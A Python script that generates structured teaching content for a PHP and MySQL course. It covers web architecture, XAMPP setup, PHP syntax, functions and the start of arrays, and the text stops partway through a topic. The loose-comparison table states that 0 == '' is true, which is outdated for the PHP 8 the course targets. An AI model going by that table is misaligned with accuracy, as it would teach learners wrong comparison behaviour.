# Generate complete 8 modules for PHP with MySQL
import json, os

def get_php_modules():
    modules = [
        {
            "module_no": 1,
            "title": "Introduction to Web Development & Setting up Environment",
            "hours": 4,
            "marks": 5,
            "topics": [
                {
                    "id": "php_m1_t1",
                    "title": "Web Development Architecture: Client vs Server-Side & HTTP Lifecycle",
                    "subtopics": ["Client-Side vs Server-Side Architecture", "HTML Basics & DOM", "Role of PHP and MySQL in Dynamic Web Applications", "HTTP Request-Response Lifecycle"],
                    "intro": {
                        "definition": "Web development encompasses the architectural engineering, scripting, and data management required to deliver applications across the World Wide Web. It bifurcates into client-side computing (presentation and interaction in the browser) and server-side computing (backend business logic, persistent data processing, and dynamic markup synthesis).",
                        "background": "The early Web was strictly static, delivering flat HTML documents. The emergence of CGI in 1993, followed by Rasmus Lerdorf creating PHP in 1994, enabled dynamic server-side content generation. Pairing PHP with MySQL and Apache formed the legendary LAMP stack, powering over 75% of dynamic websites globally.",
                        "importance": "Understanding client-server separation guarantees application security, data integrity, transactional atomicity, and scalable distributed system design.",
                        "objectives": [
                            "Differentiate client-side rendering from server-side script execution.",
                            "Trace the end-to-end lifecycle of an HTTP request from DNS lookup to HTML rendering.",
                            "Explain how PHP executes scripts and interfaces with MySQL databases.",
                            "Analyze DOM construction and server-side markup generation."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Client-side computing executes within the restricted sandbox of the web browser using HTML5, CSS3, and JavaScript. Server-side computing executes on host operating systems, orchestrating database transactions, session persistence, and API integrations.",
                        "terminology": [
                            {"term": "Client-Side", "definition": "Code executed inside the browser engine without direct access to host storage or backend databases."},
                            {"term": "Server-Side", "definition": "Code compiled and executed on remote servers prior to transmission, concealing credentials and proprietary business logic."},
                            {"term": "HTTP Protocol", "definition": "Stateless application-layer protocol coordinating request verbs (GET, POST, PUT, DELETE) and status responses (200, 404, 500)."},
                            {"term": "LAMP Stack", "definition": "Open-source enterprise software stack: Linux OS, Apache HTTP Server, MySQL/MariaDB RDBMS, and PHP engine."}
                        ],
                        "principles": "1. Statelessness: HTTP retains no conversational state between discrete requests without cookies or tokens.\n2. Zero-Trust Client: Client input must always be validated server-side as browsers can be manipulated.\n3. Separation of Concerns: Presentation is decoupled from data modeling and application logic.",
                        "structures": "User Agent (Browser) <== Network / HTTP ==> Web Server (Apache) <== FastCGI ==> PHP Zend Engine <== TCP 3306 ==> MySQL Server"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. User initiates a request by submitting a URL or clicking an action button.",
                            "2. The browser resolves the hostname to an IP address via DNS lookup and establishes a TCP handshake on port 80/443.",
                            "3. The browser sends an HTTP request payload containing headers, cookies, and parameters.",
                            "4. The Apache web server accepts the connection and identifies requested file types.",
                            "5. For .php files, Apache forwards the request to the PHP interpreter via FastCGI (PHP-FPM) or mod_php.",
                            "6. The Zend Engine compiles PHP code to intermediate opcodes and executes the logic.",
                            "7. If data is required, PHP establishes a socket connection to MySQL on port 3306 and runs SQL queries.",
                            "8. MySQL executes queries and returns relational recordsets back to the PHP process.",
                            "9. PHP embeds dynamic data into HTML templates and streams the output to Apache.",
                            "10. Apache wraps the response into an HTTP 200 payload and transmits it back to the client browser for rendering."
                        ],
                        "comparison_table": {
                            "headers": ["Architectural Dimension", "Client-Side Execution", "Server-Side Execution (PHP)"],
                            "rows": [
                                ["Runtime Environment", "Web Browser (Chrome V8, Firefox Gecko)", "Server Host (Apache / PHP-FPM / CLI)"],
                                ["Code Visibility", "Completely exposed via DevTools", "Fully private and protected on server"],
                                ["Database Communication", "Blocked directly due to security risks", "Full authorized access via internal sockets"],
                                ["Processing Load", "Distributed over user hardware", "Concentrated on server CPU and RAM"],
                                ["Primary Technologies", "HTML5, CSS3, JavaScript, WebAssembly", "PHP, Python, Java, Node.js, Go"]
                            ]
                        },
                        "code_architecture": "<?php\n// Server-Side Dynamic Generation\n$userId = 101;\n$db = new mysqli('localhost', 'root', '', 'makaut_portal');\n$stmt = $db->prepare('SELECT name, course, cgpa FROM students WHERE id = ?');\n$stmt->bind_param('i', $userId);\n$stmt->execute();\n$student = $stmt->get_result()->fetch_assoc();\n?>\n<!DOCTYPE html>\n<html>\n<body>\n  <h1>Student Profile: <?= htmlspecialchars($student['name']) ?></h1>\n  <p>Enrolled Course: <?= htmlspecialchars($student['course']) ?></p>\n  <p>Current CGPA: <strong><?= number_format($student['cgpa'], 2) ?></strong></p>\n</body>\n</html>"
                    },
                    "diagram": {
                        "caption": "Figure 1.1: Complete Architectural Workflow of Client-Server Interaction in PHP-MySQL Applications",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='25' y='30' width='180' height='180' rx='10' fill='#F7F8FC' stroke='#8DB9F0' stroke-width='2'/><rect x='25' y='30' width='180' height='36' rx='10' fill='#377FE6'/><text x='115' y='53' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>CLIENT TIER</text><text x='115' y='90' font-family='sans-serif' font-size='12' font-weight='600' fill='#19283D' text-anchor='middle'>Web Browser</text><text x='115' y='115' font-family='sans-serif' font-size='11' fill='#617087' text-anchor='middle'>• DOM &amp; HTML5</text><text x='115' y='135' font-family='sans-serif' font-size='11' fill='#617087' text-anchor='middle'>• CSS3 Styles</text><text x='115' y='155' font-family='sans-serif' font-size='11' fill='#617087' text-anchor='middle'>• JavaScript Engine</text><rect x='45' y='175' width='140' height='22' rx='4' fill='#E9E8F8'/><text x='115' y='190' font-family='sans-serif' font-size='10' font-weight='600' fill='#786CE5' text-anchor='middle'>HTTP Client</text><path d='M 210 80 L 305 80' stroke='#377FE6' stroke-width='2.5'/><text x='258' y='70' font-family='sans-serif' font-size='10' font-weight='700' fill='#377FE6' text-anchor='middle'>1. GET/POST</text><path d='M 305 150 L 210 150' stroke='#28A994' stroke-width='2.5'/><text x='258' y='170' font-family='sans-serif' font-size='10' font-weight='700' fill='#28A994' text-anchor='middle'>4. HTML Stream</text><rect x='310' y='20' width='220' height='200' rx='10' fill='#F7F8FC' stroke='#786CE5' stroke-width='2'/><rect x='310' y='20' width='220' height='36' rx='10' fill='#786CE5'/><text x='420' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>SERVER TIER</text><text x='420' y='80' font-family='sans-serif' font-size='12' font-weight='700' fill='#19283D' text-anchor='middle'>Apache HTTP Server</text><rect x='330' y='95' width='180' height='60' rx='6' fill='#FFFFFF' stroke='#8DB9F0' stroke-width='1.5'/><text x='420' y='115' font-family='sans-serif' font-size='11' font-weight='700' fill='#377FE6' text-anchor='middle'>PHP 8.x Zend Engine</text><text x='420' y='135' font-family='sans-serif' font-size='10' fill='#617087' text-anchor='middle'>Opcode Compilation</text><text x='420' y='195' font-family='sans-serif' font-size='10' font-weight='600' fill='#786CE5' text-anchor='middle'>FastCGI / mod_php Process</text><path d='M 535 85 L 595 85' stroke='#28A994' stroke-width='2.5'/><text x='565' y='75' font-family='sans-serif' font-size='10' font-weight='700' fill='#28A994' text-anchor='middle'>2. SQL</text><path d='M 595 145 L 535 145' stroke='#377FE6' stroke-width='2.5'/><text x='565' y='165' font-family='sans-serif' font-size='10' font-weight='700' fill='#377FE6' text-anchor='middle'>3. Rows</text><rect x='600' y='30' width='175' height='180' rx='10' fill='#F7F8FC' stroke='#28A994' stroke-width='2'/><rect x='600' y='30' width='175' height='36' rx='10' fill='#28A994'/><text x='687' y='53' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>DATABASE TIER</text><text x='687' y='90' font-family='sans-serif' font-size='12' font-weight='600' fill='#19283D' text-anchor='middle'>MySQL Server (3306)</text><text x='687' y='115' font-family='sans-serif' font-size='11' fill='#617087' text-anchor='middle'>• InnoDB Storage</text><text x='687' y='135' font-family='sans-serif' font-size='11' fill='#617087' text-anchor='middle'>• Relational Schema</text><rect x='620' y='170' width='135' height='22' rx='4' fill='#E8F6F3'/><text x='687' y='185' font-family='sans-serif' font-size='10' font-weight='600' fill='#1B6F61' text-anchor='middle'>Persistent Tables</text></svg>"
                    },
                    "examples": {
                        "scenario": "Live University Portal Result Lookup",
                        "code": "<?php\nheader('Content-Type: text/html; charset=UTF-8');\n$roll = filter_input(INPUT_GET, 'roll', FILTER_SANITIZE_SPECIAL_CHARS);\nif (!$roll) { die('<p>Roll missing</p>'); }\n$student = ['name' => 'Sourav Ghosh', 'course' => 'BCA Sem V', 'grade' => 'O'];\necho 'Student: ' . htmlspecialchars($student['name']) . ' Result: ' . $student['grade'];\n?>"
                    },
                    "important_points": [
                        "Client-side scripts run inside browser sandboxes without direct OS or database access.",
                        "PHP is an interpreted, server-side language that outputs compiled markup to the client.",
                        "HTTP is inherently stateless; state management requires cookies or sessions.",
                        "The client never receives raw PHP script code; only the resulting HTML output is transmitted.",
                        "Validation must be executed on the server side because client-side checks can be bypassed."
                    ],
                    "revision": {
                        "summary": "Three-tier architecture separates client presentation, server application logic, and database persistence. HTTP links the client and server via stateless request-response transactions.",
                        "terminology": "Client-side, Server-side, Zend Engine, HTTP protocol, LAMP stack.",
                        "mechanisms": "DNS -> TCP handshake -> HTTP Request -> Apache -> PHP Compilation -> MySQL Query -> HTML Stream -> DOM Parsing.",
                        "common_mistakes": "Believing client-side JavaScript validation provides security against malicious data submission."
                    }
                },
                {
                    "id": "php_m1_t2",
                    "title": "Development Environment Setup: Installation of XAMPP/WAMP, Apache, MySQL & PHP Configuration",
                    "subtopics": ["XAMPP vs WAMP Architecture", "Apache Web Server Configuration (httpd.conf)", "PHP Engine Runtime Tuning (php.ini)", "MySQL Daemon Configuration (my.ini)"],
                    "intro": {
                        "definition": "A local development environment bundles the Apache web server, MySQL/MariaDB database, and PHP runtime into an integrated desktop installation, enabling offline development without remote hosting.",
                        "background": "Historically, compiling Apache, PHP, and MySQL individually on Windows required manual configuration of binaries, C++ runtimes, and ports. Bundled suites like XAMPP and WAMP streamlined this workflow with unified graphical controls.",
                        "importance": "Configuring web daemons, adjusting memory limits, tuning upload sizes, and troubleshooting port 80 collisions are fundamental administrative skills for web engineers.",
                        "objectives": [
                            "Install and configure Apache, MySQL, and PHP via XAMPP Control Manager.",
                            "Tune runtime directives in php.ini including display_errors and memory_limit.",
                            "Resolve network port collisions on ports 80, 443, and 3306.",
                            "Configure document roots and virtual host directories."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "XAMPP runs Apache on port 80 and MySQL on port 3306. Requests to http://localhost route to loopback address 127.0.0.1, pointing to the htdocs directory.",
                        "terminology": [
                            {"term": "htdocs", "definition": "The default public document root directory where web files are served from."},
                            {"term": "php.ini", "definition": "The master configuration file regulating PHP runtime memory, error reporting, and extensions."},
                            {"term": "httpd.conf", "definition": "The central configuration file governing Apache web server behavior and port bindings."},
                            {"term": "Loopback (127.0.0.1)", "definition": "Standard IP address assigned to the local host network interface."}
                        ],
                        "principles": "1. Port Exclusivity: Only one operating system process can bind to a specific TCP port simultaneously.\n2. Least Privilege: Secure default administrative credentials before deployment.\n3. Verbose Local Debugging: Enable full error reporting in development while suppressing it in production.",
                        "structures": "C:\\xampp\\htdocs\\ <--- Web Root | C:\\xampp\\php\\php.ini <--- PHP Config | C:\\xampp\\apache\\conf\\httpd.conf <--- Apache Config"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Download and run the XAMPP installer on Windows.",
                            "2. Select Apache, MySQL, and phpMyAdmin components.",
                            "3. Launch XAMPP Control Panel and start Apache and MySQL.",
                            "4. If port 80 is occupied by Windows IIS, change the port in httpd.conf to 8080.",
                            "5. If port 3306 is occupied, reconfigure my.ini to port 3307.",
                            "6. Navigate to http://localhost/phpmyadmin to verify MySQL database management.",
                            "7. Create a project directory in C:\\xampp\\htdocs\\bca_portal.",
                            "8. Adjust upload_max_filesize = 32M and post_max_size = 64M in php.ini.",
                            "9. Restart Apache service in the control panel to apply php.ini adjustments."
                        ],
                        "comparison_table": {
                            "headers": ["Directive", "Development Value", "Production Value", "Significance"],
                            "rows": [
                                ["display_errors", "On", "Off", "Prevents sensitive path disclosure to users"],
                                ["error_reporting", "E_ALL", "E_ALL & ~E_DEPRECATED", "Enforces strict local code quality"],
                                ["upload_max_filesize", "32M", "10M", "Maximum size of a single uploaded file"],
                                ["post_max_size", "64M", "20M", "Maximum size of entire HTTP POST request body"]
                            ]
                        },
                        "code_architecture": "# Recommended php.ini Directives\nerror_reporting = E_ALL\ndisplay_errors = On\nmax_execution_time = 300\nmemory_limit = 256M\npost_max_size = 64M\nupload_max_filesize = 32M\ndate.timezone = 'Asia/Kolkata'"
                    },
                    "diagram": {
                        "caption": "Figure 1.2: Local Development Architecture and Directory Paths in XAMPP",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>XAMPP LOCAL STACK ARCHITECTURE (127.0.0.1 / localhost)</text><rect x='40' y='70' width='220' height='130' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='150' y='95' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>Apache (Port 80/8080)</text><text x='55' y='125' font-family='sans-serif' font-size='11' fill='#19283D'>• Document Root: /htdocs</text><text x='55' y='150' font-family='sans-serif' font-size='11' fill='#19283D'>• Config: httpd.conf</text><text x='55' y='175' font-family='sans-serif' font-size='11' fill='#617087'>• MPM Multi-threading</text><rect x='290' y='70' width='220' height='130' rx='8' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='400' y='95' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>PHP 8.x Engine</text><text x='305' y='125' font-family='sans-serif' font-size='11' fill='#19283D'>• Config: php.ini</text><text x='305' y='150' font-family='sans-serif' font-size='11' fill='#19283D'>• Extensions: mysqli, pdo</text><text x='305' y='175' font-family='sans-serif' font-size='11' fill='#617087'>• Memory: 256MB</text><rect x='540' y='70' width='220' height='130' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='650' y='95' font-family='sans-serif' font-size='12' font-weight='700' fill='#28A994' text-anchor='middle'>MySQL (Port 3306)</text><text x='555' y='125' font-family='sans-serif' font-size='11' fill='#19283D'>• Config: my.ini</text><text x='555' y='150' font-family='sans-serif' font-size='11' fill='#19283D'>• Default User: root</text><text x='555' y='175' font-family='sans-serif' font-size='11' fill='#617087'>• Admin: phpMyAdmin</text></svg>"
                    },
                    "examples": {
                        "scenario": "Local Environment Diagnostic Script",
                        "code": "<?php\necho '<h2>System Environment Verification</h2>';\necho 'PHP Version: ' . phpversion() . '<br>';\n$db = @new mysqli('localhost', 'root', '');\nif ($db->connect_error) { echo 'MySQL Offline'; } else { echo 'MySQL Connected on Port 3306'; }\n?>"
                    },
                    "important_points": [
                        "XAMPP consolidates Apache, MySQL, PHP, and Perl into one local directory tree.",
                        "Web project folders must be placed under C:\\xampp\\htdocs to be reachable via localhost.",
                        "Port 80 conflicts are solved by editing Listen 80 to Listen 8080 in httpd.conf.",
                        "Modifying php.ini requires restarting the Apache daemon to take effect.",
                        "The phpinfo() function displays active configuration settings and loaded modules."
                    ],
                    "revision": {
                        "summary": "XAMPP provides an isolated local stack for web development. Proper configuration of ports and config files (httpd.conf, php.ini, my.ini) ensures an efficient local workflow.",
                        "terminology": "htdocs, php.ini, httpd.conf, loopback, port 80, port 3306, phpMyAdmin.",
                        "mechanisms": "Browser -> localhost -> Apache Port 80 -> PHP runtime -> MySQL Port 3306.",
                        "common_mistakes": "Forgetting to restart Apache after making adjustments to php.ini."
                    }
                }
            ]
        },
        {
            "module_no": 2,
            "title": "PHP Basics, Functions, Arrays and Strings",
            "hours": 8,
            "marks": 10,
            "topics": [
                {
                    "id": "php_m2_t1",
                    "title": "PHP Syntax, Variables, Data Types, Operators and Control Structures",
                    "subtopics": ["Variable Sigil ($) and Scoping", "Scalar, Compound & Special Data Types", "Strict Types vs Dynamic Type Juggling", "Conditional Branching & Loop Constructs"],
                    "intro": {
                        "definition": "PHP is a dynamically typed scripting language supporting procedural, object-oriented, and functional programming paradigms. Variables begin with the dollar sign ($) and are evaluated at runtime by the Zend Engine.",
                        "background": "Modern PHP (PHP 7 and 8) introduced strict type declarations, union types, and JIT compilation, transforming PHP from a loosely typed template engine into a high-performance backend language.",
                        "importance": "Mastery of variables, data types, operators, and control loops forms the core foundation upon which all web application logic, database data parsing, and user algorithms depend.",
                        "objectives": [
                            "Differentiate between loose equality (==) and strict equality (===) in PHP.",
                            "Declare scalar, compound, and special data types.",
                            "Utilize if-elseif, switch-case, and PHP 8 match expressions.",
                            "Construct while, for, and foreach loops for iterating data collections."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Variables do not require explicit type declaration before assignment. PHP automatically converts data types based on operator context (type coercion/juggling). Strict typing can be enforced per file with declare(strict_types=1).",
                        "terminology": [
                            {"term": "Type Juggling", "definition": "Automatic conversion of variable data types depending on the operator used in an expression."},
                            {"term": "Strict Equality (===)", "definition": "Comparison operator checking both value and data type without type coercion."},
                            {"term": "Match Expression", "definition": "PHP 8 feature providing strict type matching, return values, and exhaustive branch checking."}
                        ],
                        "principles": "1. Predictable Comparisons: Always favor strict equality (===) to prevent accidental type coercion vulnerabilities.\n2. Boundary Checking: Ensure loop termination conditions are unambiguous.",
                        "structures": "$var_name = value; | if (cond) {...} else {...} | switch ($val) {...} | foreach ($arr as $k => $v) {...}"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Variable names start with `$` followed by a letter or underscore, case-sensitive.",
                            "2. Scalar data types: Integer, Float, String, Boolean. Compound: Array, Object. Special: NULL, Resource.",
                            "3. Type juggling occurs: e.g. '10' + 20 yields integer 30.",
                            "4. Selection structures: if, else, elseif, switch, and PHP 8 match expressions.",
                            "5. Iteration structures: while, do-while, standard indexed for-loop, and foreach loop."
                        ],
                        "comparison_table": {
                            "headers": ["Operator / Construct", "Loose Behavior (==)", "Strict Behavior (===) / Match"],
                            "rows": [
                                ["0 == '0'", "True (Coerces string '0' to int 0)", "False (Int vs String)"],
                                ["0 == ''", "True (Coerces empty string to int 0)", "False (Int vs String)"],
                                ["0 == false", "True (Coerces false to int 0)", "False (Int vs Boolean)"],
                                ["null == false", "True (Both evaluate to falsey)", "False (Null vs Boolean)"],
                                ["'100' === 100", "True in loose (==)", "False in strict (===)"]
                            ]
                        },
                        "code_architecture": "<?php\ndeclare(strict_types=1);\n$marks = 85;\n$grade = match(true) {\n    $marks >= 90 => 'Outstanding (O)',\n    $marks >= 80 => 'Excellent (E)',\n    $marks >= 70 => 'Very Good (A)',\n    default => 'Needs Improvement'\n};\n\n$subjects = ['PHP' => 92, 'Java' => 88, 'Entrepreneurship' => 85];\nforeach ($subjects as $name => $score) {\n    echo \"$name: $score marks\\n\";\n}\n?>"
                    },
                    "diagram": {
                        "caption": "Figure 2.1: PHP Type System and Control Flow Execution Architecture",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#786CE5' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#786CE5'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>PHP DATA TYPES &amp; CONTROL FLOW LOGIC</text><rect x='40' y='70' width='220' height='130' rx='8' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='150' y='95' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>Scalar Types</text><text x='55' y='120' font-family='sans-serif' font-size='11' fill='#19283D'>• int: 64-bit signed integer</text><text x='55' y='140' font-family='sans-serif' font-size='11' fill='#19283D'>• float: IEEE double precision</text><text x='55' y='160' font-family='sans-serif' font-size='11' fill='#19283D'>• string: binary-safe</text><text x='55' y='180' font-family='sans-serif' font-size='11' fill='#19283D'>• bool: true / false</text><rect x='290' y='70' width='220' height='130' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='400' y='95' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>Control Constructs</text><text x='305' y='120' font-family='sans-serif' font-size='11' fill='#19283D'>• if / elseif / else</text><text x='305' y='140' font-family='sans-serif' font-size='11' fill='#19283D'>• switch &amp; PHP 8 match</text><text x='305' y='160' font-family='sans-serif' font-size='11' fill='#19283D'>• while &amp; do-while</text><text x='305' y='180' font-family='sans-serif' font-size='11' fill='#19283D'>• for &amp; foreach ($arr as $k=&gt;$v)</text><rect x='540' y='70' width='220' height='130' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='650' y='95' font-family='sans-serif' font-size='12' font-weight='700' fill='#28A994' text-anchor='middle'>Type Evaluation</text><text x='555' y='120' font-family='sans-serif' font-size='11' fill='#19283D'>• == (Loose coercion)</text><text x='555' y='140' font-family='sans-serif' font-size='11' fill='#19283D'>• === (Strict comparison)</text><text x='555' y='160' font-family='sans-serif' font-size='11' fill='#19283D'>• ?? (Null coalescing)</text><text x='555' y='180' font-family='sans-serif' font-size='11' fill='#19283D'>• ?: (Ternary operator)</text></svg>"
                    },
                    "examples": {
                        "scenario": "Calculating University Attendance Percentage & Eligibility",
                        "code": "<?php\n$total_classes = 48;\n$attended = 40;\n$attendance_pct = ($attended / $total_classes) * 100;\n$status = ($attendance_pct >= 75) ? 'Eligible for Exam' : 'Disbarred';\necho 'Attendance: ' . round($attendance_pct, 1) . '% - ' . $status;\n?>"
                    },
                    "important_points": [
                        "Variables start with `$` and do not require type declarations unless strict mode is enabled.",
                        "PHP 8 match expressions use strict comparison (===) and do not fall through like switch statements.",
                        "Always use `===` instead of `==` to prevent unintended security bypasses caused by type coercion.",
                        "`foreach` is the primary and safest construct for iterating through PHP arrays.",
                        "The null coalescing operator (`??`) allows assigning default values cleanly without notices."
                    ],
                    "revision": {
                        "summary": "PHP features scalar, compound, and special data types. Understanding strict typing (===) versus loose typing (==) is critical for bug-free control flow and application security.",
                        "terminology": "Type Juggling, Strict Types, Match Expression, Foreach, Null Coalescing.",
                        "mechanisms": "Lexical tokenization -> Dynamic type conversion -> Comparison evaluation -> Conditional branch execution.",
                        "common_mistakes": "Using loose equality (==) when checking user input or password hashes, leading to type confusion vulnerabilities."
                    }
                },
                {
                    "id": "php_m2_t2",
                    "title": "Functions in PHP: Scope, Recursion, File Inclusion & Built-in Library",
                    "subtopics": ["Defining User Functions & Return Types", "Variable Scope (Local, Global, Static)", "include vs include_once vs require vs require_once", "Essential Built-in Core Functions"],
                    "intro": {
                        "definition": "A function is a reusable block of statements that performs a specific computation. In PHP, functions support default argument values, pass-by-reference (&), variadic parameters (...), and explicit return type declarations.",
                        "background": "Procedural PHP relies heavily on structured modular functions and modular file inclusion to maintain clean, readable codebases.",
                        "importance": "Modular architecture prevents code duplication (DRY principle). Choosing correctly between `include` and `require` prevents critical system crashes and security compromises during runtime.",
                        "objectives": [
                            "Declare functions with typed parameters and strict return types.",
                            "Manage local, global, and static variable scopes.",
                            "Compare the behavior of include, require, include_once, and require_once.",
                            "Leverage standard built-in functions for dates, math, and string formatting."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Variables declared inside a function have local scope and cannot be accessed externally. The `global` keyword imports variables from global scope, while `static` preserves variable state between multiple invocations.",
                        "terminology": [
                            {"term": "require", "definition": "File inclusion statement generating an E_COMPILE_ERROR fatal error if the file is missing, halting execution."},
                            {"term": "include", "definition": "File inclusion statement generating only an E_WARNING if the file is missing, allowing execution to continue."},
                            {"term": "Static Variable", "definition": "A local function variable that retains its computed value between successive calls to the function."}
                        ],
                        "principles": "1. Critical Dependency Rule: Always use require_once for configuration, database connections, and authentication guards.\n2. Pass-by-Reference: Prefixing an argument with & modifies the original variable directly.",
                        "structures": "function name(type $arg): returnType {...} | require_once 'config.php'; | include 'header.php';"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. The PHP engine registers function signatures during initial compilation pass.",
                            "2. When called, a new execution stack frame is created with an isolated local symbol table.",
                            "3. Arguments passed by value are duplicated; arguments prefixed with `&` point to the original memory address.",
                            "4. `require_once` checks the internal hash table of included files; if already loaded, it skips re-inclusion to prevent 'Cannot redeclare function' errors.",
                            "5. When the function returns, the local stack frame is destroyed unless static variables exist."
                        ],
                        "comparison_table": {
                            "headers": ["Inclusion Statement", "Error on Missing File", "Execution Halts?", "Re-inclusion Prevented?"],
                            "rows": [
                                ["include", "E_WARNING", "No (Script continues)", "No (May duplicate code)"],
                                ["include_once", "E_WARNING", "No (Script continues)", "Yes (Checks loaded files)"],
                                ["require", "E_COMPILE_ERROR", "Yes (Fatal crash)", "No (May duplicate code)"],
                                ["require_once", "E_COMPILE_ERROR", "Yes (Fatal crash)", "Yes (Safest for libraries & DB)"]
                            ]
                        },
                        "code_architecture": "<?php\ndeclare(strict_types=1);\nfunction calculateTax(float $subtotal, float $rate = 0.18): float {\n    return round($subtotal * $rate, 2);\n}\nfunction trackHitCounter(): int {\n    static $hits = 0;\n    $hits++;\n    return $hits;\n}\n?>"
                    },
                    "diagram": {
                        "caption": "Figure 2.2: Execution Differences Between require_once and include in PHP",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>FILE INCLUSION LIFECYCLE &amp; ERROR BEHAVIOR</text><rect x='50' y='75' width='310' height='125' rx='8' fill='#ffffff' stroke='#D65F64' stroke-width='1.5'/><text x='205' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#D65F64' text-anchor='middle'>require / require_once</text><text x='65' y='125' font-family='sans-serif' font-size='11' fill='#19283D'>• Failure Level: <tspan font-weight='700' fill='#D65F64'>E_COMPILE_ERROR</tspan></text><text x='65' y='145' font-family='sans-serif' font-size='11' fill='#19283D'>• Execution Status: <tspan font-weight='700' fill='#D65F64'>FATAL CRASH</tspan></text><text x='65' y='165' font-family='sans-serif' font-size='11' fill='#617087'>• Best for: Database config, auth check</text><text x='65' y='185' font-family='sans-serif' font-size='10' font-weight='600' fill='#369B72'>✓ Prevents execution with missing dependencies</text><rect x='440' y='75' width='310' height='125' rx='8' fill='#ffffff' stroke='#F2C75C' stroke-width='1.5'/><text x='595' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#B38600' text-anchor='middle'>include / include_once</text><text x='455' y='125' font-family='sans-serif' font-size='11' fill='#19283D'>• Failure Level: <tspan font-weight='700' fill='#B38600'>E_WARNING</tspan></text><text x='455' y='145' font-family='sans-serif' font-size='11' fill='#19283D'>• Execution Status: <tspan font-weight='700' fill='#369B72'>CONTINUES RUNNING</tspan></text><text x='455' y='165' font-family='sans-serif' font-size='11' fill='#617087'>• Best for: Footer templates, optional widgets</text><text x='455' y='185' font-family='sans-serif' font-size='10' fill='#D65F64'>⚠ May output broken layout without error halt</text></svg>"
                    },
                    "examples": {
                        "scenario": "Modular Web Application Architecture",
                        "code": "<?php\nrequire_once __DIR__ . '/config/database.php';\nrequire_once __DIR__ . '/includes/header.php';\necho '<main><h2>Welcome to BCA Semester V Portal</h2></main>';\ninclude __DIR__ . '/includes/footer.php';\n?>"
                    },
                    "important_points": [
                        "`require_once` throws a fatal error and terminates execution if the file is not located.",
                        "`include` issues an E_WARNING but continues executing the script.",
                        "Static variables inside functions retain their value across multiple invocations during request execution.",
                        "Passing arguments with an ampersand (`&$var`) passes by reference, mutating the caller's variable.",
                        "Always use `require_once` for database connections and configuration scripts to prevent duplicate symbol declaration."
                    ],
                    "revision": {
                        "summary": "Functions provide modular reusability in PHP. `require_once` guarantees mandatory libraries are loaded exactly once with fatal error guards, while `include` allows graceful degradation for non-critical assets.",
                        "terminology": "require_once, include, global, static variable, pass-by-reference, fatal error.",
                        "mechanisms": "File path resolution -> Inclusion cache check -> Bytecode compilation -> Symbol registration.",
                        "common_mistakes": "Using `include` instead of `require_once` for database connection files, causing subsequent database queries to crash with undefined variable warnings."
                    }
                },
                {
                    "id": "php_m2_t3",
                    "title": "Arrays & Strings: Array Functions, String Manipulation & Unicode Processing",
                    "subtopics": ["Indexed, Associative & Multidimensional Arrays", "Array Functions (array_merge, array_map, array_filter)", "String Manipulation (strlen, substr, strpos, explode, implode)", "Regular Expressions (preg_match)"],
                    "intro": {
                        "definition": "Arrays in PHP are ordered maps associating values to keys. Strings are ordered byte sequences. PHP provides an extensive built-in library of over 100 array and string functions.",
                        "background": "Unlike C or Java, PHP arrays are dynamic, hash-table based ordered dictionaries that can seamlessly store heterogeneous data types, mixed string/integer keys, and nested structures.",
                        "importance": "All HTTP requests, database recordsets, JSON payloads, and session states are represented in PHP as associative arrays. Proficiency in array and string transformations is required for backend engineering.",
                        "objectives": [
                            "Construct indexed, associative, and multidimensional arrays.",
                            "Manipulate collections with array_map, array_filter, array_reduce, and in_array.",
                            "Tokenize, slice, and concatenate strings using explode, implode, substr, and str_replace.",
